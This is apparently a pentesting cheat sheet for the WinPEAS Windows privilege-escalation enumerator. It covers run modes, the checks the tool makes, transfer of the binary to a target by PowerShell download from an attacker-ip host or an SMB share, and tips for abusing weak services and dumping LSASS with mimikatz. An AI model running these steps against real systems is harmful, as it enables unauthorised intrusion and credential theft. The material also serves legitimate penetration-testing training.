## 🚀 Execution on Target

From Windows command prompt or PowerShell:

```
winPEASany.exe
```

Optional (less output):

```
winPEASany.exe quiet
```

Run with all checks:

```
winPEASany.exe all
```

Color-friendly output:

```
winPEASany.exe color
```

Output to file:

```
winPEASany.exe > peas_output.txt
```

## 🔍 Notable Enumeration Features

| Category                   | Checks                                                  |                    |
| -------------------------- | ------------------------------------------------------- | ------------------ |
| 🔐 **Credentials**         | Stored passwords, SAM, LSA secrets, saved creds         |                    |
| 🧑‍💼 **Users/Groups**     | Admin users, logged-in users, domain info               |                    |
| 💾 **Files & Permissions** | Writable/owned files, unquoted service paths            |                    |
| 🛠 **Services**            | Misconfigured, vulnerable or weakly secured services    |                    |
| 🖥 **Scheduled Tasks**     | Autoruns, startup items, task misconfigurations         |                    |
| 🌐 **Network Info**        | Shares, open ports, firewall rules                      |                    |
| 📄 **Registry**            | Auto-run keys, stored passwords, UAC settings           |                    |
| 📦 **Installed Software**  | Known vulnerable software, running AV                   |                    |
| 🧰 **Other**               | AlwaysInstallElevated, WSL, UAC status, PowerShell logs | ## 🛠 Useful Modes |

### 🛠 Useful Modes

| Mode            | Command                          |
| --------------- | -------------------------------- |
| Quiet mode      | `winPEASany.exe quiet`           |
| Full scan       | `winPEASany.exe all`             |
| Only user info  | `winPEASany.exe userinfo`        |
| Search keywords | `winPEASany.exe search:password` |
| Help            | `winPEASany.exe help`            |

## 📁 Transferring to Target

### Method 1: Python HTTP Server

On attacker's Linux machine

```
python3 -m http.server 8080
```

On target Windows machine

```
powershell -c "Invoke-WebRequest http://<attacker-ip>:8080/winPEASany.exe -OutFile winPEAS.exe"
```

### Method 2: SMB Share

```
sudo impacket-smbserver share $(pwd) -smb2support
```

```
copy \\<attacker-ip>\share\winPEASany.exe .
```

## 🔧 Post-Enumeration Tips

After running `WinPEAS`, look for:

- 🔑 **Stored credentials** in config files, registry, or SAM
- 🔁 **Always Install Elevated**: run `.msi` as SYSTEM
- 🗂 **Unquoted service paths** with writable directories
- 🧨 **Weak service permissions** (`sc qc`, `accesschk.exe`)
- 🔧 **Writable scheduled tasks**
- 🧾 **Credential files**: `unattend.xml`, `sysprep.xml`, etc.
- 🧠 **Running as SYSTEM**? Time to dump LSASS (`mimikatz`) or escalate to domain.












